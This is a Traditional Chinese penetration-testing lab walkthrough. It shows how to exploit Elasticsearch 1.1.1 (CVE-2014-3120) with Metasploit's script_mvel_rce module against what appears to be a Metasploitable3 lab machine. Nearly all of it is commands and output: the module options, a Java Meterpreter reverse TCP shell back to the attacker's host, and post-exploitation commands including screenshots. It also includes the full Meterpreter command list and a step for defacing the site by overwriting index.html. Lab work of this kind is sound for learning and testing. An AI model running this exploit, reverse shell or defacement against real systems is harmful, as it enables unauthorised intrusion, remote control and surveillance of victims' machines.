# Elasticsearch滲透測試


- nmap 結果
- Google 搜尋 Elasticsearch 1.1.1 cve 
- https://www.cvedetails.com/cve/CVE-2014-3120/
- [CVE-2014-3120 的metasploit模組]()

```
msf > use exploit/multi/elasticsearch/script_mvel_rce
msf exploit(script_mvel_rce) > show targets
    ...targets...
msf exploit(script_mvel_rce) > set TARGET < target-id >
msf exploit(script_mvel_rce) > show options
    ...show and set options...
msf exploit(script_mvel_rce) > exploit
```

```
setg RHOSTS 10.0.2.4  (setg 代表設定為全域變數)
```

## 進行攻擊
```
msf6 > use exploit/multi/elasticsearch/script_mvel_rce
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/elasticsearch/script_mvel_rce) > options

Module options (exploit/multi/elasticsearch/script_mvel_rce):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port
                                           ][...]
   RHOSTS       10.0.2.6         yes       The target host(s), see https://github.com/rapid7/meta
                                           sploit-framework/wiki/Using-Metasploit
   RPORT        9200             yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       The path to the ElasticSearch REST API
   VHOST                         no        HTTP server virtual host
   WritableDir  /tmp             yes       A directory where we can write files (only for *nix en
                                           vironments)
Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   ElasticSearch 1.1.1 / Automatic


msf6 exploit(multi/elasticsearch/script_mvel_rce) > exploit

[*] Started reverse TCP handler on 10.0.2.15:4444 
[*] Trying to execute arbitrary Java...
[*] Discovering remote OS...
[+] Remote OS is 'Windows Server 2008 R2'
[*] Discovering TEMP path
[+] TEMP path identified: 'C:\Windows\TEMP\'
[*] Sending stage (58060 bytes) to 10.0.2.6
[*] Meterpreter session 1 opened (10.0.2.15:4444 -> 10.0.2.6:49315) at 2021-12-07 11:30:34 -0500
[!] This exploit may require manual cleanup of 'C:\Windows\TEMP\JQzzV.jar' on the target

meterpreter > ls
Listing: C:\Program Files\elasticsearch-1.1.1
=============================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100776/rwxrwxrw-  11358  fil   2014-02-12 12:35:54 -0500  LICENSE.txt
100776/rwxrwxrw-  150    fil   2014-03-25 19:38:22 -0400  NOTICE.txt
100776/rwxrwxrw-  8093   fil   2014-03-25 19:38:22 -0400  README.textile
40776/rwxrwxrw-   4096   dir   2014-04-16 18:28:54 -0400  bin
40776/rwxrwxrw-   0      dir   2014-04-16 18:28:54 -0400  config
40776/rwxrwxrw-   0      dir   2016-12-02 16:28:48 -0500  data
40776/rwxrwxrw-   8192   dir   2014-04-16 18:28:54 -0400  lib
40776/rwxrwxrw-   4096   dir   2021-12-07 10:56:25 -0500  logs

meterpreter > pwd
C:\Program Files\elasticsearch-1.1.1
meterpreter > sysinfo
Computer    : metasploitable3
OS          : Windows Server 2008 R2 6.1 (amd64)
Meterpreter : java/windows
meterpreter > 

```
```
攻擊成功後便可透過meterpreter在靶機上蒐集資訊或進行其他攻擊了
sysinfo : 靶機的系統資訊
shell : 進入靶機的cmd shell
whoami : 顯示目前使用者的身分 (authority/system : 最高權限，相當於root)
```
```
滲透測試–Elasticsearch 1.1.1 –首頁替換

移動到 C:\inetpub\wwwroot 下，並將index.html上傳(覆蓋掉原本的index.html)

```
```
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    execute       Execute a command
    getenv        Get one or more environment variable values
    getuid        Get the user that the server is running as
    localtime     Displays the target system local date and time
    pgrep         Filter processes by name
    ps            List running processes
    shell         Drop into a system command shell
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command       Description
    -------       -----------
    keyevent      Send key events
    mouse         Send mouse events
    screenshare   Watch the remote user desktop in real time
    screenshot    Grab a screenshot of the interactive desktop


Stdapi: Webcam Commands
=======================

    Command       Description
    -------       -----------
    record_mic    Record audio from the default microphone for X seconds


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system

meterpreter > screenshot  /home/kali
Screenshot saved to: /home/kali/imUXeoZV.jpeg
```

